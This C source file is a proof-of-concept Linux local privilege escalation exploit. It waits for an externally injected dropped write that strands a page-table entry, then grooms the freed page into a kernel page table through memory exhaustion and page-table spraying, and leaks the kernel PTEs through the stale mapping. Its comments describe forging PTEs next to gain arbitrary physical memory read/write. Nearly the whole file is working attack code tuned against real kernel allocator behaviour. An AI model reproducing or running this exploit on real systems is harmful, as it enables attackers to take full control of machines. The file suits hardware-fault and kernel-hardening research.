/*

Dropped-write "Dirty Pagetable" LPE, unprivileged, faults injected EXTERNALLY
(EMFI / the qemu mem-scan sim -- NOT the dropwrite LKM, NO cheats).

Two phases:

  Phase 1 -- trigger (unchanged idea from the original PoC):
    Map memfd A a bunch of times, then MAP_FIXED-remap each over the same
    address to memfd B (updating <2MiB at a time so the L2 pte-page doesn't
    move). During the remap the kernel rewrites the leaf PTEs; if an external
    dropped write lands on one of those PTE stores, the PTE keeps pointing at
    A's page while its VMA now points at B. We scan for that: a probe that
    still reads A's magic after the remap to B == a stale PTE. `dangle` is that
    address; the stale page X is B's page at `dangle_off`.

  Phase 2 -- groom X into a page table (Dirty Pagetable):
    1. free X: fallocate(PUNCH_HOLE) on B at dangle_off -> X onto movable pcp.
    2. flush X pcp->buddy the unprivileged way: a big filler STAYS mapped so
       movable memory is exhausted (X becomes ~the only movable free page),
       while munmap'ing a small filler overflows the movable pcp `high`
       watermark and drains the list (incl. X) into the buddy free area.
    3. spray pte-pages: map a pre-cached SHARED memfd at many fresh addresses.
       Each mapping needs its own leaf pte-page (UNMOVABLE) but reuses cached
       data pages (no competing movable alloc). This drains the unmovable
       freelist; the fallback then steals the lone movable free page X and
       hands it back as a pte-page.
    4. read the kernel PTEs through the stale mapping `dangle` and print them.
       (Next step toward LPE: WRITE dangle to forge a PTE -> arbitrary phys R/W.)

We decide "X is a page table" by scanning the stale mapping for PTE-shaped entries

Grooming is sized dynamically from /proc/meminfo at Phase-2 time, so this works
across guests with arbitrary RAM (tested from ~512 MB up to 16 GB). The big
filler is sized to drain essentially all *currently free* movable memory (so X
is ~the only movable free page), leaving only a small fixed headroom; the pcp
flush scales gently with zone size to reliably overflow the pcp `high`
watermark. See groom_params() below.

*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mman.h>
#include <assert.h>
#include <errno.h>
#include <limits.h>
#include <fcntl.h>

#define FOUR_KB 0x1000
#define ONE_MB 0x100000
#define MEMFD_SIZE (2 * ONE_MB)
#define PROBE_STRIDE (8 * FOUR_KB)
#define MAP_COUNT (1024 * 16)  // PTEs should exceed L3

/* grooming tunables */
#define MAGIC_F      0xf00df00du /* spray-file marker; its pfns show up in PTEs */
#define HEADROOM_MB  40          /* MemAvailable to leave after the fill: drain movable
				    free hard so X (an isolated order-0 page) is ~the
				    ONLY movable free block, hence the first the unmovable
				    fallback steals. Above the ~66 MB min watermark once
				    you account for MemAvailable already excluding it. */
#define SPRAY_VMA_MARGIN 512     /* VMAs to leave under vm.max_map_count for our
				    surviving mappings + slop */
#define SPRAY_FLOOR_MB   4       /* last-resort bail: the fallback steal only fires
				    when free is nearly exhausted, so we must spray
				    almost to OOM to reach it. The steal itself is a
				    successful alloc (detected same iteration), so we
				    don't OOM on success; this only guards the failure
				    case (X unstealable), where the box dies anyway. */
#define SPRAY_TOUCH  64          /* pages faulted per mapping (1 pte-page, 64 set-PTEs) */
#define SCAN_EVERY   64          /* MemAvailable/bail poll cadence (count_ptes runs every
				    map regardless -- see spray loop) */

#define FILL_CHUNK_MB 16         /* granularity of the incremental prefill: bounds
				    how far we can overshoot the floor per step */

/* grooming plan, computed at runtime from /proc/meminfo */
struct groom {
	long floor_kb;   /* stop the incremental prefill when MemAvailable hits this */
};

void *maps[MAP_COUNT];

void hexdump(void *addr, size_t len) {
	uint8_t *buf = (uint8_t *)addr;
	for (size_t i = 0; i < len; i += 16) {
		printf("%p:  ", &buf[i]);
		for (size_t j = 0; j < 16 && (i + j < len); j++)
			printf("%02x ", buf[i+j]);
		printf("\n");
	}
}

void swap_int(int *a, int *b) {
	int tmp = *a; *a = *b; *b = tmp;
}

/* upper bound on a plausible pfn, set from MemTotal at startup. The old code
 * hard-coded pfn < 0x40000 (== 1 GB), which silently rejects every real PTE on
 * a box with >1 GB RAM -- F's cached pages sit anywhere in physical memory, so
 * a correctly-groomed page table would score 0. Scale it with actual RAM. */
static uint64_t g_max_pfn = 0x40000;

/* count PTE-shaped entries (present|user, plausible pfn) */
static int count_ptes(volatile uint64_t *page) {
	int hits = 0;
	for (int i = 0; i < 512; i++) {
		uint64_t e = page[i];
		uint64_t pfn = (e >> 12) & 0xffffffffffULL;
		if ((e & 1) && (e & 4) && pfn > 0x100 && pfn < g_max_pfn)
			hits++;
	}
	return hits;
}

/* read a "Key: N kB" line from /proc/meminfo; returns kB or -1 */
static long meminfo_kb(const char *key) {
	FILE *f = fopen("/proc/meminfo", "r");
	if (!f) return -1;
	char line[256];
	size_t klen = strlen(key);
	long val = -1;
	while (fgets(line, sizeof line, f)) {
		if (!strncmp(line, key, klen) && line[klen] == ':') {
			val = strtol(line + klen + 1, NULL, 10);
			break;
		}
	}
	fclose(f);
	return val;
}

/* Largest per-CPU pageset `high` watermark (in pages) across all zones, read
 * from /proc/zoneinfo (informational: it shows how much movable memory can sit
 * on the pcp ahead of X, which is why we drain the pcp via memory pressure
 * rather than an explicit flusher). `high:` (with colon) is the pcp field; the
 * zone's own `high` watermark has no colon, so this doesn't match it. */
static long max_pcp_high_pages(void) {
	FILE *f = fopen("/proc/zoneinfo", "r");
	if (!f) return -1;
	char line[256];
	long maxhigh = -1;
	while (fgets(line, sizeof line, f)) {
		char *p = strstr(line, "high:");
		if (p) {
			long v = strtol(p + 5, NULL, 10);
			if (v > maxhigh) maxhigh = v;
		}
	}
	fclose(f);
	return maxhigh;
}

/* Plan the groom from current memory. Call *after* the trigger scaffolding is
 * reclaimed so the numbers reflect what we're about to drain.
 *
 * floor: the prefill drains free memory down to this MemAvailable level so the
 *   high-order movable free blocks are gone and X (an isolated order-0 page) is
 *   ~the only movable free block -- hence the first one the unmovable fallback
 *   steals. We do NOT compute a one-shot allocation size: anonymous filler is
 *   unreclaimable and MemAvailable overestimates how much we can pin, so a
 *   single up-front allocation overshoots into the OOM killer. The caller fills
 *   in small chunks and re-reads MemAvailable, stopping here -- low, but above
 *   the OOM/min watermarks. */
static struct groom groom_params(void) {
	long total_kb = meminfo_kb("MemTotal");
	size_t total_mb = total_kb > 0 ? (size_t)total_kb / 1024 : 512;
	long high_pages = max_pcp_high_pages();
	long floor_kb = (long)HEADROOM_MB * 1024;

	printf("meminfo: total %zu MB, pcp high %ld pages -> prefill floor %ld MB free\n",
	       total_mb, high_pages, floor_kb / 1024);
	return (struct groom){ .floor_kb = floor_kb };
}

/* memfd of MEMFD_SIZE filled with `magic` at every page start */
static int mk_spray_src(uint32_t magic) {
	int fd = memfd_create("spray", MFD_CLOEXEC);
	if (fd < 0 || ftruncate(fd, MEMFD_SIZE)) { perror("spray memfd"); return -1; }
	for (off_t o = 0; o < MEMFD_SIZE; o += FOUR_KB) {
		lseek(fd, o, SEEK_SET);
		if (write(fd, &magic, 4) != 4) { perror("spray write"); return -1; }
	}
	return fd;
}

int main()
{
	setbuf(stdout, NULL);

	/* Pin to CPU 1, not 0: CPU 0 is the noisiest core (default IRQ affinity,
	 * timer/housekeeping), so its per-CPU pageset churns the most. A quieter
	 * CPU's pcp list makes the pcp->buddy flush of X more deterministic. The
	 * external fault injector is CPU-agnostic, so pinning doesn't affect it. */
	cpu_set_t set; CPU_ZERO(&set); CPU_SET(1, &set);
	if (sched_setaffinity(0, sizeof set, &set)) perror("setaffinity");

	/* accept PTEs pointing anywhere in physical RAM (+50% slack for holes/MMIO
	 * above the top of RAM) so detection works regardless of installed memory. */
	long memtotal_kb = meminfo_kb("MemTotal");
	if (memtotal_kb > 0)
		g_max_pfn = (uint64_t)(memtotal_kb / 4) * 3 / 2;
	printf("hello (max pfn 0x%llx)\n", (unsigned long long)g_max_pfn);

	int mfd_a, mfd_b, mfd_c;
	int magic_a = 0xdeadbeef, magic_b = 0xcafebabe;

	mfd_a = memfd_create("hax_a", MFD_CLOEXEC);
	if (mfd_a < 0) { perror("memfd_create"); return -1; }
	mfd_b = memfd_create("hax_b", MFD_CLOEXEC);
	if (mfd_b < 0) { perror("memfd_create"); return -1; }
	mfd_c = memfd_create("hax_c", MFD_CLOEXEC);
	if (mfd_c < 0) { perror("memfd_create"); return -1; }

	if (ftruncate(mfd_a, MEMFD_SIZE) != 0) { perror("ftruncate"); return -1; }
	if (ftruncate(mfd_b, MEMFD_SIZE) != 0) { perror("ftruncate"); return -1; }
	if (ftruncate(mfd_c, MEMFD_SIZE) != 0) { perror("ftruncate"); return -1; }

	// populate the memfds with recognizeable values
	for (size_t i = 0; i < MEMFD_SIZE; i += PROBE_STRIDE) {
		assert(lseek(mfd_a, i, SEEK_SET) >= 0);
		assert(write(mfd_a, &magic_a, sizeof(magic_a)) == sizeof(magic_a));
		assert(lseek(mfd_b, i, SEEK_SET) >= 0);
		assert(write(mfd_b, &magic_b, sizeof(magic_b)) == sizeof(magic_b));
	}

	// create some full 2MiB mappings to begin with
	for (size_t i = 0; i < MAP_COUNT; i++) {
		maps[i] = mmap(NULL, MEMFD_SIZE, PROT_READ | PROT_WRITE,
			       MAP_SHARED | MAP_POPULATE, mfd_c, 0);
		if (maps[i] == MAP_FAILED) { perror("mmap"); return -1; }
	}
	printf("initial mmap complete\n");

	// ===== Phase 1: wait for an external dropped write to strand a PTE =====
	uintptr_t dangle = 0;
	size_t dangle_off = 0;
	size_t dangle_idx = 0;
	for (;;) {
		swap_int(&mfd_a, &mfd_b);
		swap_int(&magic_a, &magic_b);

		for (size_t i = 0; i < MAP_COUNT; i++) {
			void *res = mmap(maps[i], MEMFD_SIZE - FOUR_KB,
					 PROT_READ | PROT_WRITE,
					 MAP_SHARED | MAP_FIXED | MAP_POPULATE, mfd_a, 0);
			if (res == MAP_FAILED) { perror("mmap"); return -1; }
		}

		for (size_t i = 0; i < MAP_COUNT && !dangle; i++) {
			for (size_t j = 0; j < MEMFD_SIZE; j += PROBE_STRIDE) {
				int probed = *(int *)((uint8_t *)(maps[i]) + j);
				if (probed != magic_a && probed == magic_b) {
					printf("w00t!!!!!! dropped write!!!\n");
					dangle = (uintptr_t)((uint8_t *)(maps[i]) + j);
					dangle_off = j;
					dangle_idx = i;
					break;
				}
			}
		}
		if (dangle) break;
		printf("probed\n");
	}

	printf("stale PTE @ %p (mfd_b page, off 0x%zx)\n", (void *)dangle, dangle_off);
	hexdump((void *)dangle, 0x40);

	// ===== Phase 2: groom the freed page X into a leaf page table =====

	/* Reclaim the trigger scaffolding to give grooming room, but KEEP the
	 * mapping that carries the stale PTE (its leaf pte-page must survive). */
	for (size_t i = 0; i < MAP_COUNT; i++) {
		if (i == dangle_idx) continue;
		munmap(maps[i], MEMFD_SIZE - FOUR_KB);
	}
	close(mfd_c);

	/* spray source: a shared memfd cached once, so re-mapping it faults in
	 * pte-pages without allocating fresh (movable) data pages. */
	int f = mk_spray_src(MAGIC_F);
	if (f < 0) return -1;
	if (mmap(NULL, MEMFD_SIZE, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_POPULATE, f, 0) == MAP_FAILED) {
		perror("cache F"); return -1;
	}

	/* plan the groom from what's actually free right now */
	struct groom g = groom_params();

	/* Swap breaks the core invariant: if the kernel can page the anonymous
	 * filler out, the movable free pool is no longer drained and X stops being
	 * the standout movable free block, so the fallback never has to steal it.
	 * As an unprivileged process we can't swapoff; just warn loudly. */
	long swap_total = meminfo_kb("SwapTotal");
	if (swap_total > 0)
		printf("WARNING: SwapTotal %ld MB > 0 -- filler may be paged out, "
		       "breaking the groom. Consider `swapoff -a` on the target.\n",
		       swap_total / 1024);

	/* Big filler exhausts movable free (STAYS mapped). Fill in small chunks and
	 * watch live MemAvailable so we drain down to the floor WITHOUT tripping the
	 * OOM killer -- a single up-front allocation sized from MemAvailable
	 * overshoots because our anonymous pages can't be reclaimed. The chunk
	 * mappings are intentionally leaked (never munmap'd): they must stay pinned
	 * so the movable free pool stays drained through the spray. Draining hard
	 * here is what makes X the lone movable free block. */
	size_t chunk = (size_t)FILL_CHUNK_MB * ONE_MB;
	size_t filled_mb = 0;
	long avail_kb;
	while ((avail_kb = meminfo_kb("MemAvailable")) > g.floor_kb) {
		char *c = mmap(NULL, chunk, PROT_READ | PROT_WRITE,
			       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (c == MAP_FAILED) { perror("prefill chunk"); break; }
		madvise(c, chunk, MADV_NOHUGEPAGE);
		for (size_t o = 0; o < chunk; o += FOUR_KB) c[o] = 1;
		filled_mb += FILL_CHUNK_MB;
	}
	printf("filled %zu MB movable (MemAvailable now %ld MB)\n",
	       filled_mb, avail_kb / 1024);

	/* free X: punch it out of B's page cache -> onto the movable pcp list */
	if (fallocate(mfd_b, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
		      dangle_off, FOUR_KB)) {
		perror("punch"); return -1;
	}
	printf("freed X\n");

	/* X is now on the movable per-CPU pageset. We deliberately do NOT free an
	 * explicit "flusher" to overflow the pcp `high` watermark: under load `high`
	 * inflates to ~20 MB, so the flusher would dump ~28 MB of freed movable
	 * pages back as high-order blocks -- and the fallback steals every one of
	 * those before it ever reaches the isolated order-0 X. Instead we rely on the
	 * spray below: allocating pte-pages against a nearly-empty zone drives the
	 * allocator slow path, which calls drain_all_pages() and spills X pcp->buddy
	 * WITHOUT adding any competing movable free. With the fill having drained the
	 * high-order movable blocks, X is then ~the only movable free block, so the
	 * first fallback steal takes it. */

	/* Spray budget: vm.max_map_count is an upper VMA bound, but it is NOT the
	 * terminating constraint -- on this target it's 1048576, so a runaway spray
	 * would allocate ~4 GB of pte-pages and OOM. Termination is driven by the
	 * MemAvailable guard in the loop below: once the unmovable freelist empties,
	 * the fallback steals X's movable block early and the scan catches it; if it
	 * never does, we bail before OOM instead of getting killed. */
	long max_maps = 65530; /* kernel default if the sysctl is unreadable */
	FILE *mmc = fopen("/proc/sys/vm/max_map_count", "r");
	if (mmc) { if (fscanf(mmc, "%ld", &max_maps) != 1) max_maps = 65530; fclose(mmc); }
	long spray_budget = max_maps - SPRAY_VMA_MARGIN;
	if (spray_budget < 0) spray_budget = 0;

	/* Bail before OOM: stop spraying if free memory drops below this. Keep it
	 * above the kernel's min watermark (min_free_kbytes) with slack, since a
	 * pte-page fault that can't be satisfied invokes the OOM killer on us. */
	long spray_floor_kb = SPRAY_FLOOR_MB * 1024;
	printf("spray budget %ld maps (vm.max_map_count=%ld), bail below %ld MB free\n",
	       spray_budget, max_maps, spray_floor_kb / 1024);

	/* Drain the unmovable freelist -> the fallback steals X's movable block and
	 * hands it back as a pte-page mapping F's cached pages.
	 *
	 * The steal fires only when the unmovable freelist is empty -- i.e. when free
	 * memory is nearly exhausted, right where a coarse scan + conservative bail
	 * would stop. But that steal is a *successful* allocation (it steals rather
	 * than OOMs), so X becomes the pte-page and the fault writes a PTE into it
	 * the same iteration. So we scan count_ptes() on EVERY map (it's cheap: 512
	 * reads) to catch X the instant it lands, before spraying further toward OOM,
	 * and only poll MemAvailable/bail periodically. */
	volatile uint64_t *stale = (volatile uint64_t *)dangle;
	int best = 0;
	long avail = LONG_MAX;
	for (long k = 0; k < spray_budget; k++) {
		char *m = mmap(NULL, MEMFD_SIZE, PROT_READ | PROT_WRITE,
			       MAP_SHARED, f, 0);
		if (m == MAP_FAILED) {
			printf("spray mmap failed at k=%ld (%s)\n", k, strerror(errno));
			break;
		}
		/* Force a 4KB pte-mapping: without this, THP maps F's 2MB folio at the
		 * PMD level so NO leaf pte-page is allocated (and every mapping shares
		 * one huge folio) -- the unmovable freelist never drains and X is never
		 * stolen. NOHUGEPAGE makes each mapping allocate its own leaf pte-page. */
		madvise(m, MEMFD_SIZE, MADV_NOHUGEPAGE);
		for (int t = 0; t < SPRAY_TOUCH; t++)
			(void)((volatile char *)m)[t * FOUR_KB];

		/* cheap: scan the stale page every iteration so we detect X the moment
		 * the fallback converts it into a pte-page. */
		int n = count_ptes(stale);
		if (n > 16) {
			printf("[+] PAGE TABLE IN THE HOLE at k=%ld (%d PTEs, %ld MB free)\n",
			       k, n, avail / 1024);
			printf("leaked PTEs via stale mapping %p:\n", (void *)dangle);
			for (int i = 0; i < 512; i++) {
				uint64_t e = stale[i];
				if (e)
					printf("  pte[%3d] = 0x%016llx  (pfn 0x%llx)\n",
					       i, (unsigned long long)e,
					       (unsigned long long)((e >> 12) & 0xffffffffffULL));
			}
			return 0;
		}

		/* periodic: progress + OOM bail (MemAvailable read is the expensive bit) */
		if ((k % SCAN_EVERY) == 0) {
			avail = meminfo_kb("MemAvailable");
			if (n > best) {
				best = n;
				printf("  k=%ld: %d PTE-shaped entries, %ld MB free, "
				       "PageTables %ld MB\n",
				       k, n, avail / 1024, meminfo_kb("PageTables") / 1024);
			}
			if (avail >= 0 && avail < spray_floor_kb) {
				printf("[-] bailing at k=%ld: MemAvailable %ld MB below floor "
				       "(best %d PTEs, PageTables %ld MB)\n",
				       k, avail / 1024, best, meminfo_kb("PageTables") / 1024);
				break;
			}
		}
	}

	printf("[-] no pte-page reclaim within budget\n");
	return 1;
}
